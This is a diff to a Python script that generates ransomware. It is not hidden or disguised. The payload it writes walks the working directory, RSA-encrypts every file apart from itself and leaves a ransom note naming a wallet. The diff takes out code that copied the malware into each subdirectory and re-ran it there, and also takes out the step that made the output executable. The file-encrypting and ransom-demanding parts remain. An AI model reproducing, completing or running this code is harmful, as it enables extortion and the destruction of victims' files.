@@ -29,7 +29,6 @@ text = f"""\
 #!/usr/bin/python3.9
 import base64
 import os
-import shutil
 import shlex
 from subprocess import Popen, PIPE
 from Crypto.PublicKey import RSA
@@ -67,7 +66,7 @@ def encrypt(datafile, publickey):
 def gather(path):
     for root, dirs, files_list in os.walk(path):
         for file in files_list:
-            if file == "ransomware.py":
+            if file == "{filename}":
                 continue
             files.append(os.path.join(root, file))
     return files
@@ -75,27 +74,6 @@ def gather(path):
 gather('.')
 for file in files:
     encrypt(file, public_key)
-
-# This way the payload encrypts everything in subdirectories
-subdir = []
-
-# Change this if compiling an executable
-cmd = "python3 {filename}"
-
-#Start with the current directory
-for dir in os.listdir("."):
-    d = os.path.join(".", dir)
-    if os.path.isdir(dir):
-        subdir.append(dir)
-
-# Spread the malware to subdirectories
-for item in subdir:
-    subdir = "".join(item)
-    shutil.copy("{filename}", item)
-    os.chdir(item)
-    Popen(shlex.split(cmd), stdin=PIPE, stderr=PIPE, stdout=PIPE)
-    print("Files encrypted...")
-    os.chdir("..")
 
 # Demand the ransom
 wallet = '''{wallet}'''
@@ -115,6 +93,3 @@ with open("ransom.txt", "w") as theransom:
 with open(filename, "w") as payload:
     payload.write(text)
     print("Ransomware Generated...")
-    executable = f"chmod +x {filename}"
-    subprocess.call(shlex.split(executable))
-    print("Your file is ready to be executed...")
